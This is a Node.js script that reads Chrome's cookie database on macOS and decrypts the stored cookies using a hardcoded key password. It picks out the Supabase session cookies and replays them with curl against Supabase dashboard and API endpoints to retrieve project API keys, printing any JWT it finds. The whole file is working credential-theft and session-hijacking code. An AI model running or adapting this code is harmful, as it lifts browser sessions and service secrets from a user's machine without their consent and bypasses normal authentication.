const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');

const keyPassword = 'zHk+1c8moIzMYus//AT6xg==';
const derivedKey = crypto.pbkdf2Sync(Buffer.from(keyPassword, 'utf8'), Buffer.from('saltysalt', 'utf8'), 1003, 16, 'sha1');
const cookieDbPath = require('path').join(process.env.HOME, 'Library/Application Support/Google/Chrome/Default/Cookies');
const tmpDbPath = '/tmp/chrome_sb_keys.db';
fs.copyFileSync(cookieDbPath, tmpDbPath);
const output = execSync(`sqlite3 "${tmpDbPath}" "SELECT host_key, name, hex(encrypted_value) FROM cookies WHERE host_key LIKE '%supabase%';"`, { encoding: 'utf8', maxBuffer: 1024 * 1024 });
fs.unlinkSync(tmpDbPath);

const cookies = {};
for (const line of output.trim().split('\n').filter(Boolean)) {
  const [hostKey, name, hexEncrypted] = line.split('|');
  const encryptedValue = Buffer.from(hexEncrypted, 'hex');
  try {
    const prefix = encryptedValue.slice(0, 3).toString();
    if (prefix === 'v10' || prefix === 'v11') {
      const decipher = crypto.createDecipheriv('aes-128-cbc', derivedKey, Buffer.alloc(16, 0x20));
      let decrypted = Buffer.concat([decipher.update(encryptedValue.slice(3)), decipher.final()]);
      const padLen = decrypted[decrypted.length - 1];
      if (padLen > 0 && padLen <= 16) decrypted = decrypted.slice(0, decrypted.length - padLen);
      cookies[name] = decrypted.slice(32).toString('utf8');
    }
  } catch (e) {}
}

const cookieHeader = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
const projectRef = cookies['project_ref'];
console.log('Project URL: https://' + projectRef + '.supabase.co');

// Try multiple endpoints
const urls = [
  'https://supabase.com/dashboard/api/project/' + projectRef + '/api-keys',
  'https://supabase.com/dashboard/api/project/' + projectRef + '/settings',
  'https://api.supabase.com/v1/projects/' + projectRef + '/api-keys',
];

for (const url of urls) {
  console.log('\n=== ' + url + ' ===');
  try {
    const result = execSync(`curl -s --max-time 10 -L -H "Cookie: ${cookieHeader}" -H "Accept: application/json" "${url}"`, { encoding: 'utf8', maxBuffer: 1024 * 1024 });
    if (result.trim().startsWith('<')) {
      console.log('HTML response, length:', result.length);
      const match = result.match(/eyJ[A-Za-z0-9_-]{20,}/);
      if (match) console.log('Found JWT key:', match[0]);
    } else {
      console.log(result.substring(0, 800));
    }
  } catch (e) {
    console.log('Failed:', e.message.substring(0, 100));
  }
}
